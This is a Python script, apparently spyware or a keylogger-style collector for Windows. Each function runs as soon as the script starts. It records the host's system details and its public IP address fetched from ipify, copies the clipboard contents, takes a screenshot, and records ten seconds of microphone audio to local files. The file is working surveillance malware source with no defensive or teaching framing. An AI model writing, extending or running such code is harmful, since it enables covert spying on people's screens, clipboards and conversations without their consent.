
# LIBRARIES TO BE IMPORTED
import socket
import platform
import win32clipboard
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab


# DEFINITIONS TO BE MADE
sys_info = "sys_info.txt"
audio_info = "audio_info.wav"
screen_info = "screen_info.png"
clipboard_info = "clipboard.txt"

mic_time = 10
time_iteration = 15
iterationnumber_end = 3

file_path = ""
extension = "\\"
merge_files = file_path + extension


# FUNCTION TO RETRIEVE COMPUTER INFORMATION
def computer_info():

    with open(file_path + extension + sys_info, "a") as f:
        hostname = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address:" + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        f.write("Processor Info: " + (platform.processor()) + '\n')
        f.write("System Info: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine Details: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address:" + IPAddress + '\n')

# RUN FUNCTION
computer_info()


# FUNCTION TO RETRIEVE CONTENTS OF USER CLIPBOARD
def copy_clipboard():
    with open(file_path + extension + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied") # in the Event an image or complex file has been saved in the clipboard

# RUN FUNCTION
copy_clipboard()


# FUNCTION TO SCREENGRAB THE CURRENT USER'S SCREEN
def screengrab():
    img = ImageGrab.grab()
    img.save(file_path + extension + screen_info)

# RUN FUNCTION
screengrab()


# FUNCTION TO RECORD THE MICROPHONE OF THE USER
def microphone():
    sf = 44100 #sampling frequency
    seconds = mic_time

    myrecording = sd.rec(int(seconds * sf), samplerate=sf, channels=2)
    sd.wait()

    write(file_path + extension + audio_info, sf, myrecording)

# RUN FUNCTION
microphone()

